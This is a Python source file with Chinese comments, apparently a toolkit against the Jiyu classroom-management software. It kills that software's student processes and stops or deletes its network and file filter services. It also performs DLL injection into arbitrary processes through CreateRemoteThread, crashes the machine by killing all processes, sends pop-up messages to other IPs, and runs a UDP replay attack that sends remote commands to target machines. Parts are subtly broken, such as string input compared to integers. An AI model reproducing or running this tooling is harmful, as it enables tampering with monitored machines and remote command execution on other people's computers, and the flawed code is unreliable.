from utils.shortcuts import *
from utils.imports import *
from utils.udpAttack import *


# 函数快速调用区
class windowOperation:
    def pin(windowTitle):
        try:
            hwnd = win32gui.FindWindow(None, windowTitle)  # 获取所有窗口句柄
            # hwnd = win32gui.FindWindow('xx.exe', None)
            win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)
            # ctypes.windll.user32.ShowWindow(hwnd, 3)
            win32gui.SetWindowPos(
                hwnd,
                win32con.HWND_TOPMOST,
                0,
                0,
                0,
                0,
                win32con.SWP_NOMOVE
                | win32con.SWP_NOACTIVATE
                | win32con.SWP_NOOWNERZORDER
                | win32con.SWP_SHOWWINDOW
                | win32con.SWP_NOSIZE,
            )
            # 取消置顶
            # win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,win32con.SWP_SHOWWINDOW|win32con.SWP_NOSIZE|win32con.SWP_NOMOVE)
            if __name__ == "__main__":
                pass
        except Exception:
            print("\n[!] 执行出现错误。请检查窗口标题是否正确后重试。")

    def unpin(windowTitle, isForced=False):
        try:
            hwnd = win32gui.FindWindow(None, windowTitle)  # 获取所有窗口句柄
            # hwnd = win32gui.FindWindow('xx.exe', None)
            win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)
            # ctypes.windll.user32.ShowWindow(hwnd, 3)
            win32gui.SetWindowPos(
                hwnd,
                win32con.HWND_TOPMOST,
                0,
                0,
                0,
                0,
                win32con.SWP_NOMOVE
                | win32con.SWP_NOACTIVATE
                | win32con.SWP_NOOWNERZORDER
                | win32con.SWP_SHOWWINDOW
                | win32con.SWP_NOSIZE,
            )
            # 取消置顶
            win32gui.SetWindowPos(
                hwnd,
                win32con.HWND_NOTOPMOST,
                0,
                0,
                0,
                0,
                win32con.SWP_SHOWWINDOW | win32con.SWP_NOSIZE | win32con.SWP_NOMOVE,
            )
            if isForced == True:
                win32gui.SetWindowPos(
                    hwnd,
                    win32con.HWND_BOTTOM,
                    0,
                    0,
                    0,
                    0,
                    win32con.SWP_NOMOVE | win32con.SWP_NOSIZE | win32con.SWP_NOACTIVATE,
                )
                # 禁止再次置顶
                win32gui.SetWindowLong(
                    hwnd,
                    win32con.GWL_EXSTYLE,
                    win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
                    & ~win32con.WS_EX_TOPMOST,
                )
            if __name__ == "__main__":
                pass
        except Exception:
            if isForced != True:
                print("\n[!] 执行出现错误。请检查窗口标题是否正确后重试。")


class processOperation:
    def inject(pid, dll_path):
        print("")

        PAGE_READWRITE = 0x04
        PROCESS_ALL_ACCESS = 0x00F0000 | 0x00100000 | 0xFFF
        VIRTUAL_MEM = 0x1000 | 0x2000

        kernel32 = windll.kernel32
        dll_len = len(dll_path)

        # 获取句柄
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

        if not h_process:
            print("[!] 无法获取此PID的句柄: %s" % (pid))
            print("[!] 请确认PID: %s 有效。" % (pid))

        # 分配内存
        arg_address = kernel32.VirtualAllocEx(
            h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE
        )

        # 注入DLL
        written = c_int(0)
        kernel32.WriteProcessMemory(
            h_process, arg_address, dll_path, dll_len, byref(written)
        )

        # Resolve LoadLibraryA Address
        h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
        h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

        thread_id = c_ulong(0)

        if not kernel32.CreateRemoteThread(
            h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)
        ):
            print("[!] 注入失败，正在退出...")

        print("[+] 成功创建远程进程 0x%08x." % (thread_id.value))


class svcOperation:
    def killNetFilter():
        run("taskkill /f /im GATESRV.exe >nul 2>nul")
        run("taskkill /f /im MasterHelper.exe >nul 2>nul")
        run("sc stop TDNetFilter >nul 2>nul")
        print("\n[+] 执行完成。极域网络滤网已被关闭。")

    def killFileFilter():
        run("sc stop TDFileFilter >nul 2>nul")
        run("sc delete TDFileFilter >nul 2>nul")
        print("\n[+] 执行完成。极域文件控制服务已被卸载。")


class sysOperation:
    def BSOD():
        run('"taskkill /f /fi "pid ne 1"')


# 结束极域主程序
def func1():
    kill("StudentMain.exe")
    print("\n[+] 执行完成。")


def func2_1():
    pinTarget = ""
    pinTarget = input("\n请输入你要置顶的窗口标题: \n>> ")
    windowOperation.pin(pinTarget)


def func2_2():
    pinTarget = ""
    pinTarget = input("\n请输入你要取消置顶的窗口标题: \n>> ")
    windowOperation.unpin(pinTarget, False)


def disableJiyuPin():
    pinTarget = "屏幕广播"
    windowOperation.unpin(pinTarget, True)


def func3():
    injectTarget = ""
    injectTarget = input("\n请输入你要注入的程序PID: \n>> ")
    injectDLL = input("\n请输入你要注入的DLL文件地址: \n>> ")
    processOperation.inject(injectTarget, injectDLL)


def func4():
    print("\n你确定要立即使电脑蓝屏吗？按下任意键继续，直接关闭程序来取消！")
    run("pause>nul")
    sysOperation.BSOD()


def func5():
    print("\n")
    svcOperation.killNetFilter()
    print("[i] 执行完毕。")


def func6():
    print("\n")
    svcOperation.killFileFilter()
    print("[i] 执行完毕。")


def func7():
    cls()
    run("arp -a")
    print("\n点击任意键回到菜单。")
    run("pause>nul")


def func8():
    cls()
    msgContent = input("\n请输入你要发送的消息：\n>> ")
    msgTarget = input("\n请输入目标 IP：\n>> ")
    msgCommand = "msg /server:" + msgTarget + " * " + msgContent
    run(msgCommand)


def funcX():
    cls()
    print("\n---- UDP 重放攻击 ----")
    print("警告：如果你不知道你在干什么，请立即退出该功能，\n作者不为此程序造成的任何后果负责。")

    targetIP = input("\n请指定目标IP\n>> ")
    targetPort = input("\n请指定目标端口(默认4705)\n>> ")
    attackType = input("\n请指定一种攻击类型\n(1:发送消息 2:远程命令)\n>> ")
    attackContent = input("\n请输入发送内容\n>> ")
    sendType = ""

    if attackType == 1:
        sendType = "-msg"
    if attackType == 2:
        sendType = "-c"

    sendContent = pkg_sendlist(sendType, attackContent)

    send_list = []
    send_list.append(sendContent)

    print("\n按下任意键发起攻击。")
    system("pause>nul")
    print("")

    try:
        send(send_list, targetIP, int(1), int(0), int(targetPort))
    except Exception as e:
        print("[!]", e)
